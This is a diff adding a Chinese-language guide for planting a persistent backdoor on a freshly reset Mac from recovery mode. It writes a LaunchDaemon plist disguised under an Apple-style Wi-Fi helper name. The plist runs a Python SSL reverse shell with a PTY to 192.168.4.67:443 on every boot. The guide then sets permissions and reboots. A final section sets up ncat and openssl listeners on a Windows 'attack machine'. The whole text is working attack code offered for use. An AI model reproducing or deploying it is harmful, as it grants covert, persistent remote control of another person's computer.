@@ -1,0 +1,66 @@
+Mac 端（刚重置完，在恢复模式终端）
+1. 挂载 Data
+
+bash
+diskutil mount /dev/disk3s4
+2. 写 LaunchDaemon（唯一后门，稳定、带 PTY）
+
+bash
+cat > "/Volumes/Data/Library/LaunchDaemons/com.apple.wifi.WiFiHelper.plist" << 'EOF'
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
+<plist version="1.0">
+<dict>
+    <key>Label</key>
+    <string>com.apple.wifi.WiFiHelper</string>
+    <key>ProgramArguments</key>
+    <array>
+        <string>/usr/bin/python3</string>
+        <string>-c</string>
+        <string>import socket,subprocess,os,ssl,pty,time,sys;H='192.168.4.67';P=443;while True:try:s=socket.socket();s.connect((H,P));c=ssl.create_default_context().wrap_socket(s,server_hostname='');os.dup2(c.fileno(),0);os.dup2(c.fileno(),1);os.dup2(c.fileno(),2);pty.spawn('/bin/bash');except:time.sleep(10)</string>
+    </array>
+    <key>RunAtLoad</key>
+    <true/>
+    <key>KeepAlive</key>
+    <true/>
+    <key>ThrottleInterval</key>
+    <integer>10</integer>
+</dict>
+</plist>
+EOF
+3. 加权限（普通权限即可，不要 immutable flag）
+
+bash
+chown root:wheel "/Volumes/Data/Library/LaunchDaemons/com.apple.wifi.WiFiHelper.plist"
+chmod 644 "/Volumes/Data/Library/LaunchDaemons/com.apple.wifi.WiFiHelper.plist"
+4. 验证文件确实在正确位置
+
+bash
+ls -l "/Volumes/Data/Library/LaunchDaemons/com.apple.wifi.WiFiHelper.plist"
+5. 重启
+
+bash
+reboot
+攻击机（Windows）
+方案 A（最佳）：用 Ncat 监听
+
+下载安装 Nmap for Windows。
+
+打开命令提示符执行：
+
+cmd
+ncat --ssl -lvvp 443 --keep-open
+方案 B（备选）：OpenSSL 循环监听（不如 ncat 稳，但可用）
+先生成证书（若已有可跳过）：
+
+cmd
+openssl req -x509 -newkey rsa:2048 -keyout key.pem -out cert.pem -days 3650 -nodes -subj "/CN=192.168.4.67"
+创建 listener.bat：
+
+bat
+:loop
+openssl s_server -quiet -key key.pem -cert cert.pem -port 443 -ign_eof
+timeout /t 2 >nul
+goto loop
+双击运行。
+
